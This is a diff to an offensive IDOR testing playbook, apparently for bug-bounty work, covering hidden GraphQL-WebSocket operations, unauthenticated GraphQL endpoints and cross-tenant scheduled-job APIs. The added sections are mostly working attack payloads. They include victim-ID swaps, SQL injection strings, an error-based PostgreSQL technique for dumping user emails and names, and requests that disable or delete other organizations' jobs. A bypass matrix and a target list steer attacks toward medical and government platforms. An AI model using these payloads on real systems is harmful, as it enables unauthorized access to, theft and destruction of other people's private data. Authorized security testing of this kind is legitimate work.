@@ -885,9 +885,107 @@ POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
 
 ---
 
+## GraphQL-WS Hidden Operations IDOR
+**Reference type:** Numeric (high-entropy or standard)
+**API pattern:** GraphQL (graphql-ws protocol over WebSocket)
+**Authorization flaw:** The `/graphql-ws` WebSocket endpoint supports GraphQL operations not exposed in the public schema or API docs. These hidden operations — discoverable only by analyzing client-side JavaScript bundles — lack ownership validation on object ID arguments. The endpoint authenticates at the WebSocket handshake level but never checks whether the requested object belongs to the connected user. When IDs have high entropy (preventing brute-force enumeration), the same ID parameter is often SQL-injectable, bypassing the entropy protection entirely.
+**Escalation:** Horizontal
+**Business impact:** Unauthorized read or write access to private structured data (legal documents, records, contracts) for any user. Chains with SQL injection to bypass high-entropy ID protections → full PII exfiltration.
+**Test payload:**
+```
+# Step 1: Find /graphql-ws in Burp WebSocket history or Burp target map
+# Step 2: Search JS bundle for operation names not in public schema:
+#   grep -E "(query|mutation|subscription)\s+\w+" main.js
+
+# Step 3: Establish connection (auth happens here):
+{"type": "connection_init", "payload": {"authorization": "Bearer <your-token>"}}
+# → Receive: {"type": "connection_ack"}
+
+# Step 4: Invoke hidden operation with your own ID first (confirm it works):
+{"id":"1","type":"start","payload":{"query":"query { document(id: \"YOUR_DOC_ID\") { content owner } }"}}
+
+# Step 5: Swap to another user's ID — if returned → IDOR confirmed
+{"id":"2","type":"start","payload":{"query":"query { document(id: \"VICTIM_DOC_ID\") { content owner } }"}}
+
+# Step 6: If IDs are high-entropy (25-digit numeric), try SQL injection in same param:
+{"id":"3","type":"start","payload":{"query":"query { document(id: \"1 OR 1=1 LIMIT 1--\") { content } }"}}
+# Error-based PostgreSQL exfil:
+{"id":"4","type":"start","payload":{"query":"query { document(id: \"1 AND CAST((SELECT email FROM users LIMIT 1) AS INT)--\") { content } }"}}
+# → Error message leaks PII: 'invalid input syntax for integer: "victim@corp.com"'
+
+# Tools: Burp Suite WebSocket tab, wscat
+# wscat -c wss://target.com/graphql-ws --header "Authorization: Bearer <yours>"
+```
+**Source:** https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a
+
+---
+
+## Unauthenticated GraphQL Object Access
+**Reference type:** Numeric / GUID
+**API pattern:** GraphQL
+**Authorization flaw:** The GraphQL endpoint is exposed without any authentication requirement — no token, cookie, or session is checked. Object ID arguments in queries allow enumeration of any user's data, including admin profiles, roles, and PII. Introduced when developers leave `/graphql` or `/api/graphql` open for development tooling and never add an auth gate before production deployment.
+**Escalation:** Vertical (admin and all-user data accessible to unauthenticated callers)
+**Business impact:** Full enumeration of admin accounts, emails, roles, and internal user records without credentials. Enables targeted attacks against platform administrators with zero prior access.
+**Test payload:**
+```http
+# Test with NO Authorization header and NO session cookie:
+POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query": "{ users(role: \"admin\") { id email role phone twoFactorEnabled } }"}
+
+# Enumerate user IDs:
+{"query": "{ user(id: 1) { id email role isAdmin } }"}
+{"query": "{ user(id: 2) { id email role isAdmin } }"}
+
+# Check if introspection is open (indicator of no auth gate):
+{"query": "{ __schema { types { name } } }"}
+
+# List all users:
+{"query": "{ allUsers { id email role createdAt lastLogin } }"}
+
+# Detection signal: any data returned without an Authorization header = confirmed
+```
+**Source:** https://medium.com/@yasser0hamoda1/unauthenticated-admin-profile-disclosure-via-graphql-idor-a-real-world-bug-bounty-find-f8647eae5237
+
+---
+
+## Scheduled Recurring Job IDOR
+**Reference type:** Numeric / UUID (`projectId`, `jobId`)
+**API pattern:** REST
+**Authorization flaw:** APIs managing scheduled/recurring data pipeline jobs scope access by a `projectId` or `jobId` parameter. The server validates that the requester is authenticated but never checks that the referenced project belongs to the authenticated user's organization. Sequential or auto-incremented project IDs allow direct cross-tenant enumeration.
+**Escalation:** Horizontal / Tenant isolation
+**Business impact:** Access to another organization's scheduled export configs, pipeline connection strings, credentials, and output data. Highest impact in analytics, BI, and ETL SaaS platforms where scheduled jobs routinely contain database credentials or sensitive business data.
+**Test payload:**
+```http
+# Observe your own project ID from normal app usage:
+GET /api/v1/schedules?projectId=PRJ-1042 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 200 OK, your scheduled jobs
+
+# Enumerate adjacent project IDs:
+GET /api/v1/schedules?projectId=PRJ-1041 HTTP/1.1
+Authorization: Bearer <your-token>
+→ If 200 OK with another org's jobs → IDOR confirmed
+
+# Additional patterns to test:
+GET /api/projects/1041/scheduled-exports HTTP/1.1
+GET /api/schedules/job_4521/results HTTP/1.1           ← another org's job output
+GET /api/pipelines?project_id=1041 HTTP/1.1
+PATCH /api/schedules/job_4521 {"enabled": false}       ← disable another org's job
+DELETE /api/schedules/job_4521                         ← delete another org's schedule
+
+# Note: auto-incremented numeric project IDs (1041, 1042, 1043...) are directly
+# enumerable with Burp Intruder; UUID-based project IDs may be leaked in API responses
+```
+**Source:** https://hackerone.com/reports/3219944
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-05-24. Update each session.
+> Current patterns as of 2026-05-25. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -930,6 +1028,24 @@ POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
    XML/form-encoded. These simple one-character changes evade a surprising number of
    access control implementations.
 
+9. **GraphQL-WS hidden operations** (NEW 2026-05) — Persistent `/graphql-ws` endpoints
+   frequently support undocumented GraphQL operations exposed only in client-side JS
+   bundles. These hidden operations skip ownership validation because they were never
+   tested as a public attack surface. When object IDs have high entropy that prevents
+   brute-forcing, the same ID parameter is often SQL-injectable — IDOR + SQLi in a single
+   chain. Always analyze `main.js` and JS chunks for GraphQL operation strings.
+
+10. **Unauthenticated GraphQL endpoints** (NEW 2026-05) — A surprising number of
+    production GraphQL endpoints require no auth token at all, exposing admin profiles,
+    user roles, and PII to unauthenticated callers. Always send a GraphQL query with zero
+    auth headers as the first test on any newly discovered `/graphql` endpoint.
+
+11. **Industry distribution (HackerOne 2025 data)** — IDOR is the top vulnerability
+    class in: medical technology (36% of all bounty reports), professional services (31%),
+    government platforms (18%), and retail/e-commerce (15%). MedTech is the highest-ratio
+    industry — target healthcare SaaS, lab management systems, and patient-portal APIs for
+    highest probability of finding critical IDOR findings.
+
 ---
 
 ## Bypass Matrix
@@ -953,6 +1069,9 @@ POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
 | WebSocket session auth | Send victim's object ID in message body after your own handshake |
 | GraphQL query/mutation ACL | Subscribe to victim's events via subscription resolver (often unprotected) |
 | Presigned URL ownership | Request `/api/files/presign` with victim's object key |
+| High-entropy object IDs | SQL-inject the same ID parameter — entropy prevents brute force, not injection |
+| GraphQL endpoint (auth assumed) | Send GraphQL query with NO Authorization header — endpoint may be fully public |
+| Operations not in GraphQL schema | Analyze client JS bundles for unlisted operation names on `/graphql-ws` |
 
 ---
 
@@ -977,6 +1096,10 @@ POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
 | GraphQL subscription `newNotification(userId:)` | GraphQL subscription | Live event stream exfiltration |
 | `/api/users/*` wildcard | Wildcard injection | Mass user data exposure |
 | Recently released feature endpoints | New feature | Immature access controls, highest ratio |
+| `/graphql-ws` hidden operations | GraphQL-WS IDOR | Private docs/records; chain to SQLi for entropy bypass |
+| `/api/v1/schedules?projectId=` | Scheduled job IDOR | Cross-org pipeline configs, credentials, output data |
+| MedTech / patient-portal APIs | Any IDOR type | 36% of MedTech bounties are IDOR — highest-ratio industry |
+| Government platform APIs | Any IDOR type | 18% of gov bounties — high-value PII, citizen records |
 
 ---
 
@@ -1120,4 +1243,50 @@ Note: WebSocket IDOR is often missed because Burp's scanner doesn't cover WS mes
 
 Impact: Critical — financial document mass exfiltration
 Detection evasion: downloads appear to come from legitimate AWS/GCS infrastructure
+```
+
+### Chain 8: GraphQL-WS Hidden Operations IDOR → SQL Injection → Full PII Exfiltration
+
+```
+1. Open Burp Suite, enable WebSocket interception, browse the target app
+   Identify persistent WebSocket connection: wss://target.com/graphql-ws
+
+2. Analyze client-side JS bundle for hidden GraphQL operation names:
+   grep -E "gql`|query\s+[A-Z]|mutation\s+[A-Z]" main.js
+   → Discover undocumented: GetDocument, LockDocument, ListDocumentsByUser
+   (these operations don't appear in the public schema or API docs)
+
+3. Connect to graphql-ws and send connection_init with your token:
+   {"type": "connection_init", "payload": {"authorization": "Bearer <your-token>"}}
+   → Receive: {"type": "connection_ack"}
+
+4. Invoke hidden operation with your own document ID (confirm it works):
+   {"id":"1","type":"start","payload":{"query":"query { document(id: \"YOUR_DOC_ID\") { content owner } }"}}
+   → Returns your document — operation is live and functional
+
+5. Swap to another user's document ID:
+   {"id":"2","type":"start","payload":{"query":"query { document(id: \"VICTIM_DOC_ID\") { content owner } }"}}
+   → Returns victim's document (no ownership check) — IDOR confirmed at graphql-ws level
+
+6. Complication: document IDs are 25-digit high-entropy numeric strings
+   Brute-force is infeasible. Normal IDOR enumeration fails here.
+
+7. Escalate — SQL inject the document ID parameter:
+   {"id":"3","type":"start","payload":{"query":"query { document(id: \"1 OR 1=1 LIMIT 1--\") { content owner } }"}}
+   → Returns a document belonging to a random user — SQLi confirmed, entropy bypassed
+
+8. Error-based PostgreSQL extraction — exfil user PII via error messages:
+   {"id":"4","type":"start","payload":{"query":"query { document(id: \"1 AND CAST((SELECT email||chr(58)||name FROM users LIMIT 1 OFFSET 0) AS INT)--\") { content } }"}}
+   → Server error: 'invalid input syntax for type integer: "victim@corp.com:John Doe"'
+
+9. Iterate OFFSET to dump full user table:
+   OFFSET 0 → user 1 email:name
+   OFFSET 1 → user 2 email:name
+   ... enumerate all users in a single authenticated WebSocket session
+
+Impact: Critical — full PII database exfiltrated via a single valid session token
+Key insight: "High-entropy IDs protect against enumeration" is NOT a substitute for
+object-level authorization. The same parameter used for IDOR can accept SQL injection.
+Always test injection in ID parameters even when brute-force is infeasible.
+Source: https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a
 ```
